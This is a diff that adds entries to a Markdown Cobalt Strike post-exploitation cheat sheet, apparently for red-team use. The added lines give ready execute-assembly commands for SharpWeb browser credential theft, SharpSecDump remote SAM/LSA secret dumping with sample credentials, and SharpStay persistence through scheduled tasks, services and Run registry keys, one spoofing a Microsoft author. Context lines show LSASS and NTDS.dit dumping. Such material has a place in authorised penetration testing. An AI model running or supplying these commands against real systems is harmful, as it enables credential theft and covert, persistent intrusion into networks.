@@ -185,6 +185,11 @@ execute-assembly SharpChrome.exe logins /pvk:key.pvk /server:SERVER.lab.local
 execute-assembly SharpChrome.exe cookies /pvk:key.pvk /server:SERVER.lab.local /format:json
 ```
 
+### [SharpWeb](https://github.com/djhohnstein/SharpWeb) - Retrieve saved credentials in Chrome, Firefox and Edge
+```
+# Retrive all saved browser credentials
+execute-assembly C:\SharpWeb.exe all
+```
 ------------------------------------------------------------------------------------------
 ## Exfiltration - Password Attacks
 ### Dumping LSASS locally (all commands below require local Admin)
@@ -219,6 +224,14 @@ download system.save
 python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL (Run on your local box)
 ```
 
+### [SharpSecDump](https://github.com/G0ldenGunSec/SharpSecDump) SAM and LSA extraction
+Remotely dump SAM and LSA secrets (same functionality as Impacket's secretsdump.py)
+```
+# Runs in the context of the current user
+# Local Admin privileges is required on the target machine
+execute-assembly C:\SharpSecDump.exe -target=192.168.1.15 -u=admin -p=Password123 -d=lab.local
+```
+
 ### NTDS.dit dump (all commands below require Domain Admin privileges!)
 
 [Invoke-DCSync.ps1](https://gist.github.com/monoxgas/9d238accd969550136db) to perform DCSync attacks remotely 
@@ -240,7 +253,23 @@ NTDSutil.exe to dump NTDS.dit locally on a Domain Controller
 ```
 shell activate instance ntds,ifm,create full C:\ntdsutil,quit,quit | ntdsutil
 ```
+------------------------------------------------------------------------------------------
+## Persistence
+[SharpStay](https://github.com/0xthirteen/SharpStay) - .NET Persistence
+```
+# Scheduled task persistence
+execute-assembly C:\Sharpstay.exe action=ScheduledTask taskname=TestTask command="C:\windows\temp\file.exe" runasuser=testuser triggertype=logon author=Microsoft Corp. description="Test Task" logonuser=testuser
 
+# Service creation persistence
+execute-assembly C:\Sharpstay.exe action=CreateService servicename=TestService command="C:\Windows\temp\file.exe"
+
+# User registry key persistence
+execute-assembly C:\Sharpstay.exe action=UserRegistryKey keyname=Debug keypath=HKCU:Software\Microsoft\Windows\CurrentVersion\Run command="C:\Windows\temp\file.exe"
+
+
+# Mnay other methods available on the tool's github documentation
+```
+[StayKit](https://github.com/0xthirteen/StayKit) - Cobalt Strike persistence kit aggressor script
 ------------------------------------------------------------------------------------------
 # References
 [Cobalt Strike commands cheat-sheet](https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet)
